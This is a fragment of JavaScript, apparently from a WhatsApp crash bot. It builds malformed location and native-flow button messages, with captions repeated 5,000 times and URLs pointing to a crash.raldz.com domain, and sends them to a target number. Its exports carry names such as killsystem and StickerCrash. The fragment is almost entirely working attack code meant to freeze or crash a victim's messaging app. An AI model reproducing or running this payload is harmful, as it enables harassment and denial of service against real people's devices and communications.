...
async function C(SYxS7, target) {
  ...
  await SYxS7.relayMessage(target, {
    locationMessage: {
      ...
      merchantUrl: "https://whatsapp." + uw + ".crash.raldz.com/" + uw + "/",
      url: "https://whatsapp." + uw + ".crash.raldz.com/" + uw + "/",
      thumbnailUrl: "https://whatsapp." + uw + ".crash.raldz.com/" + uw + "/",
      waWebSocketUrl: "https://whatsapp." + uw + ".crash.raldz.com/" + uw + "/",
      mediaUrl: "https://whatsapp." + uw + ".crash.raldz.com/" + uw + "/",
      sourceUrl: "https://whatsapp." + uw + ".crash.raldz.com/" + uw + "/",
      originalImageUrl: "https://whatsapp." + uw + ".crash.raldz.com/" + uw + "/",
    ...
    viewOnceMessage: {
      message: {
        extendedMessage: {
          ...
          nativeFlowMessage: {
            buttons: [
              { name: "catalog_message", buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000) }) },
              { name: "send_location", buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000) }) },
              { name: "mpm", buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000) }) },
              { name: "review_order", buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000) }) },
              { name: "call_permission_request", buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000) }) },
              { name: "cta_call", buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000) }) },
              { name: "review_and_pay", buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000) }) }
            ]
          }
        }
      }
...
module.exports = { killsystem, StickerCrash, U, C, h };
